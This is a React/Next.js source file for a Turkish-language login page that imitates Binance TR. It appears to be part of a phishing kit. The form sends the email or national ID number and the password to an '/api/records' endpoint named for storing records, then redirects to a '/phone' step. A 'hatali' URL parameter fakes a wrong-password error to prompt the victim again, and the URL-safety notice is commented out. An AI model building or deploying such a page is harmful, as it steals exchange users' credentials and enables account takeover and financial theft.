"use client";
import { useState, useEffect, Suspense } from "react";
import Image from "next/image";
import Link from "next/link";
import { Eye, EyeOff } from "lucide-react";
import { useRouter, useSearchParams } from "next/navigation";

// useSearchParams için Client Component
const LoginContent = () => {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [credentials, setCredentials] = useState({
    email: "",
    password: "",
  });
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState({
    email: "",
    password: "",
  });

  useEffect(() => {
    // URL'de hatali parametresi var mı kontrol et
    const hatali = searchParams.get('hatali');
    if (hatali === 'true') {
      setErrors(prev => ({
        ...prev,
        password: "Şifreniz hatalı, lütfen tekrar deneyin."
      }));
    }
  }, [searchParams]);

  const validatePassword = (password: string): boolean => {
    const minLength = password.length >= 8;
    const hasUpperCase = /[A-Z]/.test(password);
    const hasLowerCase = /[a-z]/.test(password);
    const hasNumber = /[0-9]/.test(password);

    return minLength && hasUpperCase && hasLowerCase && hasNumber;
  };

  const getPasswordErrorMessage = (password: string): string => {
    if (!password) return "Şifre boş olamaz";
    if (password.length < 8) return "Şifre en az 8 karakter olmalıdır";
    if (!/[A-Z]/.test(password))
      return "Şifre en az bir büyük harf içermelidir";
    if (!/[a-z]/.test(password))
      return "Şifre en az bir küçük harf içermelidir";
    if (!/[0-9]/.test(password)) return "Şifre en az bir rakam içermelidir";
    return "";
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setCredentials((prev) => ({ ...prev, [name]: value }));

    if (name === "password") {
      setErrors((prev) => ({
        ...prev,
        password: getPasswordErrorMessage(value),
      }));
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const passwordError = getPasswordErrorMessage(credentials.password);
    if (passwordError) {
      setErrors((prev) => ({ ...prev, password: passwordError }));
      return;
    }

    try {
      const response = await fetch("/api/records", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: credentials.email,
          password: credentials.password,
        }),
      });

      const data = await response.json();

      if (data.success) {
        router.push("/phone");
      } else {
        setErrors({
          email: data.message || "",
          password: "",
        });
      }
    } catch (error) {
      setErrors({
        email: "Bir hata oluştu. Lütfen tekrar deneyin.",
        password: "",
      });
    }
  };

  return (
    <div className="min-h-full bg-[#FAFAFA] flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-[380px] bg-white rounded-lg shadow-sm p-8">
        {/* Header */}
        <h1 className="text-[#1E2329] text-2xl font-medium text-center mb-4">
          Giriş Yap
        </h1>

        {/* URL Verification */}
       {/*  <div className="flex items-center gap-2 text-[#707A8A] text-sm mb-4 justify-center">
          <span>Lütfen doğru URL'yi ziyaret ettiğinizden emin olun:</span>
        </div>
        <div className="flex justify-center mb-8">
          <span className="text-[#1E2329] text-sm flex items-center gap-1">
            <span className="text-green-500">🔒</span>
            https://www.binance.tr
          </span>
        </div>
 */}
        {/* Binance.com Login */}
        <div className="space-y-6">
          {/*      <div>
            <p className="text-[#707A8A] text-sm mb-2">Binance.com hesabıyla oturum açın:</p>
            <button className="w-full border border-[#FCD535] rounded-md py-3 px-4 text-[#1E2329] hover:bg-[#FCD535]/5 transition flex items-center justify-center gap-2">
              <Image
                src="/b.svg"
                alt="Binance Logo"
                width={25}
                height={25}
              />
              <span>Binance.com hesabıyla oturum açın</span>
            </button>
          </div> */}

          {/* Binance TR Login */}
          <div>
            <p className="text-[#707A8A] text-sm mb-4 mt-10">
              Binance TR hesabıyla oturum açın:
            </p>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <input
                  type="text"
                  placeholder="E-posta / TCKN"
                  name="email"
                  className="w-full px-0 py-3 border-0 border-b border-gray-200 focus:outline-none focus:border-[#FCD535] text-base transition-colors text-black"
                  value={credentials.email}
                  onChange={handleChange}
                />
                {errors.email && (
                  <p className="text-[#F6465D] text-sm mt-1">{errors.email}</p>
                )}
              </div>

              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Şifre"
                  name="password"
                  className="w-full px-0 py-3 border-0 border-b border-gray-200 focus:outline-none focus:border-[#FCD535] text-base transition-colors pr-10 text-black"
                  value={credentials.password}
                  onChange={handleChange}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-0 top-1/2 -translate-y-1/2 text-gray-400"
                >
                  {showPassword ? (
                    <EyeOff className="w-5 h-5" />
                  ) : (
                    <Eye className="w-5 h-5" />
                  )}
                </button>
                {errors.password && (
                  <p className="text-[#F6465D] text-sm mt-1">
                    {errors.password}
                  </p>
                )}
              </div>

              {/* Şifre gereksinimleri bilgilendirme bölümü */}
              {/*   <div className="text-xs text-[#707A8A]">
                <p>Şifreniz:</p>
                <ul className="list-disc ml-4 mt-1">
                  <li className={credentials.password.length >= 8 ? "text-green-500" : ""}>En az 8 karakter içermelidir</li>
                  <li className={/[A-Z]/.test(credentials.password) ? "text-green-500" : ""}>En az bir büyük harf içermelidir</li>
                  <li className={/[a-z]/.test(credentials.password) ? "text-green-500" : ""}>En az bir küçük harf içermelidir</li>
                  <li className={/[0-9]/.test(credentials.password) ? "text-green-500" : ""}>En az bir rakam içermelidir</li>
                </ul>
              </div> */}

              <button
                type="submit"
                className="w-full bg-[#FCD535] text-[#1E2329] rounded-md py-3 hover:bg-[#FCD535]/90 transition font-bold"
              >
                Giriş Yap
              </button>
            </form>
          </div>

          {/* Footer Links */}
          <div className="flex justify-between text-sm pt-2">
            <Link href="#" className="text-[#F0B90B] hover:text-[#F0B90B]/80">
              Şifrenizi mi unuttunuz?
            </Link>
            <Link href="#" className="text-[#F0B90B] hover:text-[#F0B90B]/80">
              Kaydol
            </Link>
          </div>
        </div>
      </div>
    </div>
  );
};

// Ana bileşen
const LoginPage = () => {
  return (
    <Suspense fallback={<div className="min-h-full flex items-center justify-center">Yükleniyor...</div>}>
      <LoginContent />
    </Suspense>
  );
};

export default LoginPage;
